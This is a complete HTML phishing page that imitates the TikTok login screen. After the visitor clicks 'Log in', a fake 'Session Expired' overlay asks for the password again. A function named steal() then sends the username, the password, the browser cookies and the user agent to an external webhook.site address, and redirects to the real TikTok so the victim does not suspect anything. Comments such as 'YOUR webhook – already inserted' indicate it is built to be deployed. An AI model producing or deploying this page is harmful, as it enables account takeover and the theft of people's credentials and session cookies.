<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TikTok – Login</title>
  <style>
    body { margin:0; background:#000; font-family: Arial, sans-serif; }
    .tiktok-box {
      max-width:380px; margin:80px auto; background:#fff; padding:30px;
      border-radius:12px; text-align:center;
    }
    .tiktok-box img { width:120px; margin-bottom:20px; }
    .tiktok-box input {
      width:90%; padding:14px; margin:10px 0; border:1px solid #ddd;
      border-radius:6px; font-size:16px;
    }
    .tiktok-box button {
      width:96%; padding:14px; background:#fe2c55; color:#fff;
      border:none; border-radius:6px; font-size:18px; font-weight:bold;
      cursor:pointer;
    }
    .tiktok-box .small { font-size:13px; color:#888; margin-top:20px; }
    #overlay {
      display:none;
      position:fixed; top:0; left:0; width:100%; height:100%;
      background:rgba(0,0,0,0.6); z-index:99999;
      justify-content:center; align-items:center;
    }
    #overlay .card {
      background:#fff; padding:40px; border-radius:16px; max-width:400px;
      text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.5);
    }
    #overlay .card input { width:90%; padding:12px; margin:15px 0; border:1px solid #ccc; border-radius:6px; }
    #overlay .card button { background:#fe2c55; color:#fff; border:none; padding:12px 40px; border-radius:30px; font-size:16px; cursor:pointer; }
  </style>
</head>
<body>

<!-- Fake Login Box (visible first) -->
<div class="tiktok-box">
  <img src="https://static.tiktokcdn.com/ts/logo/logo-vertical.png" alt="TikTok">
  <h2>Log in to TikTok</h2>
  <input type="text" id="username" placeholder="Username or email">
  <input type="password" id="password" placeholder="Password">
  <button onclick="triggerOverlay()">Log in</button>
  <div class="small">By continuing, you agree to our Terms of Service.</div>
</div>

<!-- Overlay that pops after they click "Log in" -->
<div id="overlay">
  <div class="card">
    <h3>Session Expired</h3>
    <p>Your session has timed out. Please re-enter your password to continue.</p>
    <input type="password" id="pwd2" placeholder="Re-enter password">
    <button onclick="steal()">Verify</button>
  </div>
</div>

<script>
  // YOUR webhook – already inserted
  const WEBHOOK_URL = "https://webhook.site/44c474bd-1766-4600-bff9-a2882870a1c5";

  function triggerOverlay() {
    // Hide the main box and show overlay
    document.querySelector('.tiktok-box').style.display = 'none';
    document.getElementById('overlay').style.display = 'flex';
  }

  function steal() {
    const pwd = document.getElementById('pwd2').value;
    const username = document.getElementById('username').value;
    const cookies = document.cookie;

    // Send to your webhook
    fetch(WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: username,
        password: pwd,
        cookies: cookies,
        userAgent: navigator.userAgent,
        url: window.location.href
      })
    });

    alert('✅ Verified! Redirecting to TikTok...');
    // Redirect to real TikTok so victim doesn't suspect
    window.location.href = 'https://www.tiktok.com/';
  }
</script>
</body>
</html>
